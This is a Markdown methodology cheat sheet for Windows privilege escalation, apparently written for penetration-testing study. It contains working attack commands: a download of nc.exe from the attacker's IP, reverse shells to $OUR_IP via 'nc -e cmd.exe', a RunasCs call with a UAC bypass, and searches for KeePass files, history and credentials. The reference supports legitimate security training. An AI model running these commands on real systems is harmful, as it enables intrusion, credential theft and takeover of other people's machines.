# Methodology

**Note:** Commands that have equivalents for both CMD and PowerShell will be separated with `---`, with the CMD command first, followed by their PowerShell equivalents.

## Prep Work

```powershell
# Establish a working environment to drop files into
C:\ProgramData
C:\Users\Public
C:\Temp

# Upgrade the current shell
iwr -uri $OUR_IP/nc.exe -outfile nc.exe
rlwrap -crA nc -lvnp 9002 # On kali box
.\nc.exe $OUR_IP 9002 -e cmd.exe
powershell -ep bypass
```

## Enumeration

```powershell
# Check privileges
whoami /all

# Check local users/groups
net user --- Get-LocalUser
net user $USER
net localgroup --- Get-LocalGroup

# Check local group memberships
net localgroup $GROUP --- Get-LocalGroupMember $GROUP

# Gather system information
systeminfo              # Check "OS Name", "OS Version", "System Type"

# Gather network information
netstat -ano            # Look for new available ports
Get-Process -Id $PID    # Check the process associated with a PID
ipconfig /all           # Check "Physical Address", "DHCP Enabled", "IPv4 Address", "Default Gateway", and "DNS Servers"
route print             # Look for attack vectors to other systems or networks

# Check installed applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion

# Check dotnet version
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release

# Check running processes
Get-Process | Sort-Object Id
Get-Process | Select-Object Id, ProcessName, Path | Sort-Object Id

# Enumerate user directories
tree C:\Users /a /f
Get-ChildItem -Path C:\Users -Include ConsoleHost_history.txt -File -Force -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Check file permissions
icacls $TARGET /c

# Search for sensitive files
Get-ChildItem -Path C:\xampp -Include my.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\inetpub -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue    # KeePass database files
Get-ChildItem -Path C:\ -Include .git -Directory -Recurse -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue

# Check command history
Get-History
ls C:\Users\$USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

# Check services
Get-CimInstance -ClassName win32_service | Select ProcessId, Name, State, PathName | Sort-Object ProcessId | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Sort-Object ProcessId
Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like '$SERVICE_NAME'}

# Manage services
Restart-Service $SERVICE_NAME
net stop $SERVICE_NAME --- Stop-Service $SERVICE_NAME
net start $SERVICE_NAME --- Start-Service $SERVICE_NAME

# Check path environment variable
$env:path

# Check scheduled tasks
schtasks /query /fo LIST /v > tasks.txt
dos2unix tasks.txt     # On kali
less tasks.txt         # On kali, search for tasks owned by privileged accounts. Check "TaskName", "Next Run Time", "Author", "Task To Run", and "Run As User"
schtasks /query /fo LIST /v /TN "$TASK"
cat tasks.txt | grep \.exe | grep -iv system32
```

### Exploitation

```powershell
# RunasCs
.\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0
.\RunasCs.exe mojo "Password123!" "C:\ProgramData\System\nc.exe $OUR_IP 9005 -e cmd.exe" -t 0 --bypass-uac --logon-type 8
```

## Automated Tools

**Primary:**

1. [SharpUp](Tools/SharpUp.md)
2. [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/)
3. [Seatbelt](Tools/Seatbelt.md)

**Backup:**

1. [PowerUp](Tools/PowerUp.md)
